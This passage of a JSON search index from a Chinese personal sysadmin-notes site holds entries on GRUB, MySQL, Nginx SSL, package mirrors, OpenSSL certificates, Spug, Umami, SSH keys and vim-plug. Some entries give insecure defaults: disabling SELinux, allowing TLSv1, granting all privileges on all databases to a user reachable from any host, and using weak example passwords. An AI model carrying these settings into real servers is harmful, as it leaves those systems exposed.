的时候发现的，Arch Linux 安装过程是手动安装的，在编写 GRUB 的时候会扫描不到 Windows Manager 所在的分区（当然可能不是所有人都会遇到），所以在 GRUB 界面可能会看不到 Windows Manager 选项，导致进不去 Windows 10，这里就需要手动编辑 GRUB 信息，我们打开 /boot/grub/grub.cfg 文件，发现里面确实没有 Windows 10 的启动信息，在后面加上： 1menuentry \"Microsoft Windows 10\" { 2 insmod part_get 3 insmod fat 4 insmod search_fs_uuid 5 insmod chain 6 search --fs-uuid --set=root $hints_string $fs_uuid 7 chainloader /EFI/Microsoft/Boot/bootmgfw.efi 8} 注意： 这里的 $hints_string，代表的是终端执行命令： 1sudo grub-probe --target=hints_string /boot/efi/EFI/Microsoft/Boot/bootmgfw.efi 后的输出； 而 $fs_uuid 代表的是： 1sudo grub-probe --target=fs_uuid /boot/efi/EFI/Microsoft/Boot/bootmgfw.efi 的输出。 然后保存。在终端执行命令：sudo grub-mkconfig -o /boot/grub/grub.cfg，就 OK 了。 到此，Arch Linux 和 Windows 10 双系统也配置完毕了。 附加问题 在使用这一年多的时间，遇到了以下的几个问题： 在 Windows 10 进行了一个大更新后，会发现 GRUB 引导界面没有了，还是直接进入了 Windows 10，这时只需要按照 替换引导文件 的方法重新输入一遍命令就行。 使用 Linux 某个发行版一段时间之后，难免会想尝试一下另一个发行版。这时请务必将之前的发型版的引导文件删除，否则可能会出现无论怎么设置都无法进入 GRUB 的情况。例如：我之前用的是 Ubuntu，我现在换成了 Manjaro，我就需要用 DG 删除 EFI 分区的 Ubuntu 文件夹。 在我使用 Manjaro 更新了一次 Linux 的内核后，进不去 Windows 10 了，这个时候千万不要直接修复 Windows 10 引导，这会格式化 EFI 分区，只需要按上面 修复 Windows 引导 的方法编辑一下 GRUB 就可以了。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:52 "},"5.其他/MySQL创建新用户并给予数据库权限.html":{"url":"5.其他/MySQL创建新用户并给予数据库权限.html","title":"MySQL创建新用户并给予数据库权限","keywords":"","body":"前言 为了增加服务器数据库安全性，大多数人都会限定该用户操作指定的数据库，而无法影响到其他的数据库，从而提高了数据操作的安全性。 1. 登录数据库 mysql -u root -p 输入密码登录 2. 创建用户 create user`user`@`localhost` identified by'password'; 这样就创建了一个用户名为user，密码为password的MySQL用户。 @后面的参数是指可以登录的IP地址 '用户名'@'IP地址' //用户只能该IP下才能访问 '用户名'@'192.168.1.%' //用户只能在该IP段下才能访问(通配符%表示任意) '用户名'@'%' //用户可以再任意IP下访问(默认IP地址为%) '用户名'@'localhost' //用户只能在本地主机（安装MySQL服务器的主机）下访问 3. 授予权限 用户创建完成后，还需要进行权限赋予，否则该用户会没有权限操作数据库表。 show grants for '用户'@'IP地址'; 查看用户拥有的权限 grant all privileges on 数据库名.* to '用户'@'IP地址' with grant option; //将数据库的所有权限赋予该用户 with grant option 参数表示该用户可以将自己拥有的权限授权给别人，如果不想这个用户有这个grant的权限，可以不加这句 4. 常用命令 show databases; // 查看所有数据库 show grants for '用户名'@'IP地址'; // 查看用户拥有的权限 drop user '用户名'@'IP地址'; // 删除用户 rename user '用户名'@'IP地址' to '新用户名'@'IP地址'; // 修改用户的用户名和可登录IP set password for '用户名'@'IP地址' = password('新密码'); // 修改用户密码 set password=password('新密码'); // 修改当前登录用户的密码 revoke 权限 on 数据库.表 from '用户'@'IP地址'; // 删除用户某一权限 5. 常用权限 all privileges 除grant外的所有权限 select 仅查权限 select,insert 查和插入权限 usage 无访问权限 alter 使用alter table create 使用create table create routine 使用create procedure create temporary tables 使用create temporary tables create user 使用create user、drop user、rename user和revoke all privileges create view 使用create view delete 使用delete drop 使用drop table execute 使用call和存储过程 file 使用select into outfile 和 load data infile grant option 使用grant 和 revoke index 使用index insert 使用insert lock tables 使用lock table process 使用show full processlist select 使用select show databases 使用show databases show view 使用show view update 使用update reload 使用flush shutdown 使用mysqladmin shutdown(关闭MySQL) replication client 服务器位置的访问 replication slave 由复制从属使用 // 数据库名.* 数据库中的所有表 数据库名.表 指定数据库中的某张表 数据库名.存储过程 指定数据库中的存储过程 *.* 所有数据库中的所有表 FLUSH PRIVILEGES; flush privileges; 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"5.其他/Nginx反向代理+SSL配置模板.html":{"url":"5.其他/Nginx反向代理+SSL配置模板.html","title":"Nginx反向代理+SSL配置模板","keywords":"","body":"server { listen 80; server_name www.domain.com; # location / { // 强制 https 重定向 # rewrite ^(.*)$ https://$host$1 permanent; # } # 重定向至https return 301 https://$host$request_uri; # 网站根目录及默认网页 #root /www/xxx; #index index.html; # 日志文件 access_log /var/log/nginx/host.access.log main; } server { listen 443 ssl; server_name www.domain.com; # SSL配置 ssl on; ssl_certificate /root/ssl/chained.pem; ssl_certificate_key /root/ssl/domain.key; # SSL/TLS默认值 ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers HIGH:!aNULL:!MD5; # 减少点击劫持 add_header X-Frame-Options DENY; # 禁止服务器自动解析资源类型 add_header X-Content-Type-Options nosniff; # 防XSS攻击 add_header X-Xss-Protection 1; # 反向代理 location / { proxy_pass http://127.0.0.1:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } 二、配置完后证书文件无法访问(Centos) # 恢复正确的 SELinux type restorecon -v -R /etc/nginx/ssl/a.pe # 或者关闭SELinux（推荐） 三、非80端口转https error_page 497 301 https://$http_host$request_uri; 重点是，错误时返回301转成https ： 497 - normal request was sent to HTTPS 解释：当网站只允许https访问时，当用http访问时nginx会报出497错误码 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 17:11 "},"5.其他/NPM镜像加速.html":{"url":"5.其他/NPM镜像加速.html","title":"NPM镜像加速","keywords":"","body":"国内npm源镜像（npm加速下载） 指定npm镜像 npm 官方原始镜像网址是：https://registry.npmjs.org/ 淘宝 NPM 镜像：http://registry.npmmirror.com 阿里云 NPM 镜像：https://npm.aliyun.com 腾讯云 NPM 镜像：https://mirrors.cloud.tencent.com/npm/ 华为云 NPM 镜像：https://mirrors.huaweicloud.com/repository/npm/ 网易 NPM 镜像：https://mirrors.163.com/npm/ 中国科学技术大学开源镜像站：http://mirrors.ustc.edu.cn/ 清华大学开源镜像站：https://mirrors.tuna.tsinghua.edu.cn/ 腾讯，华为，阿里的镜像站基本上比较全 淘宝镜像源加速 NPM 最新的： npm config set registry https://registry.npmmirror.com 阿里云镜像源加速 NPM npm config set registry https://npm.aliyun.com 腾讯云镜像源加速 NPM npm config set registry http://mirrors.cloud.tencent.com/npm/ 华为云镜像源加速 NPM npm config set registry https://mirrors.huaweicloud.com/repository/npm/ 返回npm官方原始镜像 npm config set registry https://registry.npmjs.org/ 查看当前的镜像源 npm config get registry 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 17:03 "},"5.其他/Openssl创建自签名证书.html":{"url":"5.其他/Openssl创建自签名证书.html","title":"Openssl创建自签名证书","keywords":"","body":"生成根证书的私钥和证书 openssl req -x509 -nodes -days 36500 -newkey rsa:2048 -subj \"/C=CN/ST=Jiangxi/L=Jiujiang/O=Network_CA\" -keyout ./cert/CA.key -out ./cert/CA.crt -reqexts v3_req -extensions v3_ca req：表示使用 OpenSSL 的请求（request）功能。 -x509：生成自签名证书。 -nodes：不加密私钥。 -days 36500：证书有效期为 36500 天，即大约 100 年。 -newkey rsa:2048：生成一个新的 RSA 私钥，密钥长度为 2048 位。 -subj \"/C=CN/ST=China/L=China/O=private\"：指定证书的主题信息，包括国家代码（CN）、省份（ST）、城市（L）和组织（O）。 -keyout ./cert/CA.key：指定私钥的输出文件路径。 -out ./cert/CA.crt：指定证书的输出文件路径。 -reqexts v3_req：指定请求扩展的配置文件（v3_req.cnf）。 -extensions v3_ca：指定证书扩展的配置文件（v3_ca.cnf）。 创建应用证书 # 创建应用证书的私钥 openssl genrsa -out ./cert/nginx.key 2048 # 根据应用证书的私钥创建一个证书请求文件csr openssl req -new -key ./cert/nginx.key -subj \"/C=CN/ST=Jiangxi/L=Jiujiang/O=Network/CN=sharkfeiyu.com\" -sha256 -out ./cert/nginx.csr # 根据应用证书请求文件创建应用证书，创建应用证书之前需要创建应用证书的扩展描述文件，如果不使用扩展描述文件，那么浏览器中无法授信，会提示证书无效 vim ./cert/nginx.ext # 填入一下内容 ########################## [ req ] default_bits = 2048 distinguished_name = city req_extensions = san extensions = san [ city ] countryName = CN stateOrProvinceName = Jiangxi localityName = Jiujiang organizationName = Network [SAN] authorityKeyIdentifier=keyid,issuer basicConstraints=CA:FALSE keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment subjectAltName = @alt_names [ alt_names ] IP.1 = 192.168.111.3 IP.2 = 10.3.7.3 DNS.1 = sharkfeiyu.com DNS.2 = *.sharkfeiyu.com ########################## # 最后，使用csr，ext、以及根证书CA.crt创建应用证书 openssl x509 -req -days 3650 -in ./cert/nginx.csr -CA ./cert/CA.crt -CAkey ./cert/CA.key -CAcreateserial -sha256 -out ./cert/nginx.crt -extfile ./cert/nginx.ext -extensions SAN 浏览器添加信任 客户端访问 https 的时候，如果想浏览器不带警告，需要将根 证书即:ca.crt 安装到本地的受信任目录中。 双击 ca.crt 文件 点击安装证书 选择本地计算机，点击下一步 选择将所有证书都放入下列存储，点击浏览 选择受信任的根证书颁发机构，点击确定 点击完成 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 18:38 "},"5.其他/pip镜像加速.html":{"url":"5.其他/pip镜像加速.html","title":"pip镜像加速","keywords":"","body":"清华源 pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple 阿里源 pip config set global.index-url https://mirrors.aliyun.com/pypi/simple/ 腾讯源 pip config set global.index-url http://mirrors.cloud.tencent.com/pypi/simple 豆瓣源 pip config set global.index-url http://pypi.douban.com/simple/ 换回默认源 pip config unset global.index-url 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:52 "},"5.其他/Spug手动部署-Kali.html":{"url":"5.其他/Spug手动部署-Kali.html","title":"Spug手动部署-Kali","keywords":"","body":"准备环境 Python 3.6及以上 Mysql 5.6及以上 现代浏览器 自 v2.3.9 开始 Git 版本需要 2.17.0+ （影响新建常规发布申请单） 安装步骤 以下安装步骤假设项目部署在一台 Centos7 系统的 /data/spug 目录下。 1. Clone项目代码 git clone https://github.com/openspug/spug /data/spug cd /data/spug 2. 创建运行环境arch libldap24 如需要使用常规发布功能，则需要安装 git v2.17.0+。 # 安装依赖 apt-get install -y mariadb-server libmariadb-dev python3-dev gcc libldap-dev libsasl2-dev redis nginx supervisor rsync sshfs pkg-config # 创建虚拟环境 cd /data/spug/spug_api python3 -m venv venv source venv/bin/activate # 安装python包 pip install -U pip setuptools -i https://pypi.tuna.tsinghua.edu.cn/simple/ pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple/ pip install gunicorn mysqlclient -i https://pypi.tuna.tsinghua.edu.cn/simple/ yay -S libldap24 3. 修改后端配置 后端默认使用的 Sqlite 数据库，通过修改配置使用 MYSQL 作为后端数据库，如何使用SqlServer数据库？ 注意 在 spug_api/spug/ 目录下创建 overrides.py 文件，启动后端服务后会自动覆盖默认的配置，避免直接修改 settings.py 以便于后期获取新版本。 spug_api/spug/overrides.py DEBUG = False DATABASES = { 'default': { 'ATOMIC_REQUESTS': True, 'ENGINE': 'django.db.backends.mysql', 'NAME': 'spug', # 替换为自己的数据库名，请预先创建好编码为utf8mb4的数据库 'USER': 'spug_user', # 数据库用户名 'PASSWORD': 'spug_passwd', # 数据库密码 'HOST': '127.0.0.1', # 数据库地址 'OPTIONS': { 'charset': 'utf8mb4', 'sql_mode': 'STRICT_TRANS_TABLES', #'unix_socket': '/opt/mysql/mysql.sock' # 如果是本机数据库,且不是默认安装的Mysql,需要指定Mysql的socket文件路径 } } } 4. 创建数据库 systemctl restart mariadb mariadb -uroot -p ## Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 38 Server version: 10.11.8-MariaDB-1 Debian n/a Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Support MariaDB developers by giving a star at https://github.com/MariaDB/server Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MariaDB [(none)]> create database spug; Query OK, 1 row affected (0.002 sec) MariaDB [(none)]> create user 'spug_user'@'%' identified by 'spug_passwd'; Query OK, 0 rows affected (0.023 sec) MariaDB [(none)]> grant all on *.* to 'spug_user'@'%'; Query OK, 0 rows affected (0.037 sec) MariaDB [(none)]> flush privileges; Query OK, 0 rows affected (0.001 sec) MariaDB [(none)]> quit ## 5. 初始化数据库 cd /data/spug/spug_api python manage.py updatedb 6. 创建默认管理员账户 python manage.py user add -u admin -p spug.cc -s -n 管理员 # -u 用户名 # -p 密码 # -s 超级管理员 # -n 用户昵称 7. 创建启动服务脚本 mkdir /etc/supervisord.d/ vim /etc/supervisord.d/spug.ini [program:spug-api] command = bash /data/spug/spug_api/tools/start-api.sh autostart = true stdout_logfile = /data/spug/spug_api/logs/api.log redirect_stderr = true [program:spug-ws] command = bash /data/spug/spug_api/tools/start-ws.sh autostart = true stdout_logfile = /data/spug/spug_api/logs/ws.log redirect_stderr = true [program:spug-worker] command = bash /data/spug/spug_api/tools/start-worker.sh autostart = true stdout_logfile = /data/spug/spug_api/logs/worker.log redirect_stderr = true [program:spug-monitor] command = bash /data/spug/spug_api/tools/start-monitor.sh autostart = true stdout_logfile = /data/spug/spug_api/logs/monitor.log redirect_stderr = true [program:spug-scheduler] command = bash /data/spug/spug_api/tools/start-scheduler.sh autostart = true stdout_logfile = /data/spug/spug_api/logs/scheduler.log redirect_stderr = true 8. 创建前端nginx配置文件 /etc/nginx/conf.d/spug.conf server { listen 80; server_name _; # 修改为自定义的访问域名 root /data/spug/spug_web/build/; client_max_body_size 20m; # 该值会影响文件管理器可上传文件的大小限制，请合理调整 gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_http_version 1.1; gzip_comp_level 7; gzip_types text/plain text/css text/javascript application/javascript application/json; gzip_vary on; location ^~ /api/ { rewrite ^/api(.*) $1 break; proxy_pass http://127.0.0.1:9001; proxy_read_timeout 180s; proxy_redirect off; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } location ^~ /api/ws/ { rewrite ^/api(.*) $1 break; proxy_pass http://127.0.0.1:9002; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \"Upgrade\"; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } location / { try_files $uri /index.html; } } 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:52 "},"5.其他/ssh密钥远程登录.html":{"url":"5.其他/ssh密钥远程登录.html","title":"ssh密钥远程登录","keywords":"","body":" 客户端生成公私钥对 会要求输入密钥保存路径和密码，可以直接回车，默认位置是~/ssh/； 使用ssh-copy-id命令上传公钥至服务器(ip=172.16.100.10) ssh-copy-id aaa@172.16.100.10 若想使用scp上传公钥，则： scp ~/.ssh/id_rsa.pub aaa@172.16.100.10:/home/aaa/.ssh/authorized_keys 但是需注意使用该方法需提前在服务器创建.ssh文件夹，并将其权限改为700， 原因是若.ssh目录或者是其中的公钥文件能够呗其他用户可读，将不会ssh程序识别 chmod 700 ~/.ssh 或 chmod [400/600] ~/.ssh/authorized_keys 在服务器修改sshd_config文件，去掉注释启用以下参数： PubkeyAuthentication yes AuthorizedKeysFile .ssh/authorized_keys 修改完配置文件保存退出，重启服务器sshd服务 sudo systemctl restart sshd 客户端验证登录 不用使用密码直接登陆成功 注：本地密钥权限为600 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:52 "},"5.其他/Umami搭建.html":{"url":"5.其他/Umami搭建.html","title":"Umami搭建","keywords":"","body":"前言 软件需求： MySQL/MariaDB：Umami数据存放。 Nginx：使用Nginx，对umami的默认3000端口进行反向代理。 Nodejs 1. 克隆仓库 git clone https://github.com/umami-software/umami.git 2. 安装依赖 # 进入刚刚克隆的仓库内 cd umami # 使用npm进行依赖安装 npm install 3. 创建数据库 创建用户 确保已经安装了MySQL或者MariaDB，由于两则具有包含兼容关系，可以使用相同的命令 # 登录数据库 mysql -u root -p # 创建一个用户umami，密码为password，并仅允许本机登录 CREATE USER 'umami'@'localhost' IDENTIFIED BY 'password'; # 创建一个数据库umami CREATE DATABASE umami; # 赋予权限 GRANT ALL ON umami.* TO 'umami'@'localhost'; 初始化数据库(V2版本忽略) mysql -u umami -p umami 其中： -u umami：使用umami账户； -p umami：理论上 -p 代表使用密码，这里代表使用密码访问，umami代表访问的数据库。 4. 环境配置 umami需要我们配置一个.env的环境在umami根目录，umami会读取这个文件进行数据库的连接 使用vim .env编辑文件 DATABASE_URL=mysql://umami:password@localhost:3306/umami HASH_SALT=suijizifu TRACKER_SCRIPT_NAME=random-string.js 其中： 第一个umami为用户名 password为用户密码 第二个umami为数据库 HASH_SALT为Hash加盐字符，任意字符串即可 TRACKER_SCRIPT_NAME可以使umami绕过广告屏蔽插件的影响 5. 构建运行 npm run build npm start 6. 后台服务运行 此时umami已经搭建完成，但是直接使用npm启动的话只能在前台运行，远程登录关闭之后就会退出，所以这里使用systemctl来管理该服务 编辑/etc/systemd/system/umami.service 文件，写入以下内容： [Unit] Description=UmamiServer [Service] Type=simple User=user ExecStart=/usr/local/bin/cnpm start --prefix /path/umami Restart=always Environment=PATH=/usr/bin:/usr/local/bin:/userhomepath/.nvm/versions/node/v20.16.0/bin Environment=NODE_ENV=production WorkingDirectory=/path/umami [Install] WantedBy=multi-user.target 其中： User选项是运行时的用户名 ExecStart中的/usr/local/bin/cnpm是npm的安装位置，我这里使用的是cnpm运行软件，也可以选择npm的位置； /userhomepath/.nvm/versions/node/v20.16.0/bin 使由于本人使用的nvm管理nodejs版本，这里选择nvm安装对应node版本的路径，前面是用户目录； /path/umami是umami所在目录。 7. Nginx反向代理并与Halo搭配 为了能使用Https访问，或者说用443、80端口访问，而不用IP登录，这里使用nginx进行反向代理 # 安装nginx sudo apt-get install nginx -y 为了同时与Halo搭配，这里需要提前在halo后台下载umami插件； 再编辑默认配置文件/etc/nginx/sites-available/default，填入以下配置： server { listen 80; listen [::]:80; # 域名 server_name [umami.domain.com]; # 重定向至https return 301 https://$host$request_uri; } server { listen 443 ssl http2; server_name [umami.domain.com]; # SSL配置 ssl on; ssl_certificate /etc/nginx/cert/[umami.domain.com].pem; ssl_certificate_key /etc/nginx/cert/[umami.domain.com].key; add_header Access-Control-Allow-Origin 'https://[halo.domain.com]'; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS'; add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'; if ($request_method = 'OPTIONS') { return 204; } add_header Content-Security-Policy 'frame-ancestors [halo.domain.com]'; # 反向代理 location / { proxy_pass http://localhost:3000; proxy_set_header HOST $host; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_hide_header 'Access-Control-Allow-Origin'; proxy_hide_header 'Content-Security-Policy'; } } 8. Halo插件配置 根据插件配置要求进行填写： 其中： Umami站点地址为Umami的域名地址 脚本名称2.x版本默认为script.js 站点ID是在Umami创建站点后，在站点设置编辑中可以查看 共享链接与站点ID一样在站点编辑中查看 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"5.其他/Vim配置与美化.html":{"url":"5.其他/Vim配置与美化.html","title":"Vim配置与美化","keywords":"","body":"vim-plug下载 # Unix, Linux curl -fLo ~/.vim/autoload/plug.vim --create-dirs \\ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim # Windows (PowerShell) iwr -useb https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim |` ni $HOME/vimfiles/autoload/plug.vim -Force # Neovim ## Unix, Linux sh -c 'curl -fLo \"${XDG_DATA_HOME:-$HOME/.local/share}\"/nvim/site/autoload/plug.vim --create-dirs \\ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim' ## Linux (Flatpak) curl -fLo ~/.var/app/io.neovim.nvim/data/nvim/site/autoload/plug.vim --create-dirs \\ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim ## Windows (PowerShell) iwr -useb https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim |` ni \"$(@($env:XDG_DATA_HOME, $env:LOCALAPPDATA)[$null -eq $env:XDG_DATA_HOME])/nvim-data/site/autoload/plug.vim\" -Force 插件安装 插件市场：vim awesome 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:52 "},"5.其他/解决nvm安装的node使用sudo令npm报错的问题.html":{"url":"5.其他/解决nvm安装的node使用sudo令npm报错的问题.html","title":"解决nvm安装的node使用sudo令npm报错的问题","keywords":"","body":"通过软链将npm添加到usr/local/bin下面： sudo ln -s \"$NVM_DIR/versions/node/$(nvm version)/bin/node\" \"/usr/local/bin/node\" sudo ln -s \"$NVM_DIR/versions/node/$(nvm version)/bin/npm\" \"/usr/local/bin/npm\" 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:48 "},"5.其他/青龙面板.html":{"url":"5.其他/青龙面板.html","title":"青龙面板","keywords":"","body":"常用命令： 更新青龙 docker exec -it qinglong ql update 更新青龙并编译 docker exec -it qinglong ql check 启动bot docker exec -it qinglong ql check 删除7天前的所有日志 docker exec -it qinglong ql rmlog 7 通知测试 docker exec -it qinglong notify test test 立即执行脚本 docker exec -it qinglong task test.js now 并行执行脚本 docker exec -it qinglong task test.js conc 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:51 "},"联系我.html":{"url":"联系我.html","title":"联系我","keywords":"","body":"🏠 主页 网站地址：https://www.feiyunote.cn 🤝 反馈与建议 作者：睡觉的时候不困 邮箱：feiyunote@qq.com 我双手合十的愿望里永远有你。 穿越人海，只为与你相拥。 手握日月摘 ♥ 陈。 📝 版权 赣ICP备2023008387号-1 赣公网安备36052102100040号 ©2023-2024 睡觉的时候不困 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:42 "}}